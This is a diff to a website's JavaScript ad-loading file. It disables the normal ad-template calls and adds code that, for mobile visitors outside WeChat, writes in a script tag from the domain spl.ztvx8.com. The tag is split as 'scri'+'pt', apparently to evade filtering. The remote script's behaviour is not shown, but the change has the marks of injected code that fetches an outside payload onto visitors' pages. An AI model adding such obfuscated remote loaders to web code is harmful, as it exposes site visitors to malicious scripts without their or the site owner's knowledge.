@@ -296,26 +296,34 @@ function siteEnabledAlimama(url){
     return false;
 }
 function loadThirdAds(loc) {
-    if((loc === "cms_left_bottom") || loc === "pc_left_bottom"){
-        loadThirdAdsTemplate(o_data_ad_300);
+    if (isMobile() && !isWechat()) {
+        var opacity = "";
+        // if (typeof third_opacity_css != "undefined") {
+        //     opacity = third_opacity_css;
+        // }
+        document.writeln('<div style="' + opacity + '">');
+        document.writeln('<scri' + 'pt src="//spl.ztvx8.com/wlzys5.js"> </scri' + 'pt>');
+        document.writeln('</div>');
     }
-    if(loc === "cms_right_bottom"){
-        loadThirdAdsTemplate(o_data_ad_300_right);
-    }
-    if(loc === "pc_bottom"){
-        loadThirdAdsTemplate(o_data_ad_728);
-    }
-    if(loc === "pc_right_top"){
-        loadThirdAdsTemplate(o_data_ad_300_right);
-    }
-    if(loc === "m_bottom"){
-        if(isMobile()){
-            loadThirdAdsTemplate(o_data_ad_mobile,true);
-        }else{
-            loadThirdAdsTemplate(o_data_ad_300);
-        }
-    }
-
+    // if((loc === "cms_left_bottom") || loc === "pc_left_bottom"){
+    //     loadThirdAdsTemplate(o_data_ad_300);
+    // }
+    // if(loc === "cms_right_bottom"){
+    //     loadThirdAdsTemplate(o_data_ad_300_right);
+    // }
+    // if(loc === "pc_bottom"){
+    //     loadThirdAdsTemplate(o_data_ad_728);
+    // }
+    // if(loc === "pc_right_top"){
+    //     loadThirdAdsTemplate(o_data_ad_300_right);
+    // }
+    // if(loc === "m_bottom"){
+    //     if(isMobile()){
+    //         loadThirdAdsTemplate(o_data_ad_mobile,true);
+    //     }else{
+    //         loadThirdAdsTemplate(o_data_ad_300);
+    //     }
+    // }
 }
 
 function loadThirdAdsTemplate(id,mobile) {
@@ -384,3 +392,4 @@ function formatDate(){
     // 最后拼接字符串，得到一个格式为(yyyy-MM-dd)的日期
     return date.getFullYear() + seperator + nowMonth + seperator + strDate;
 }
+
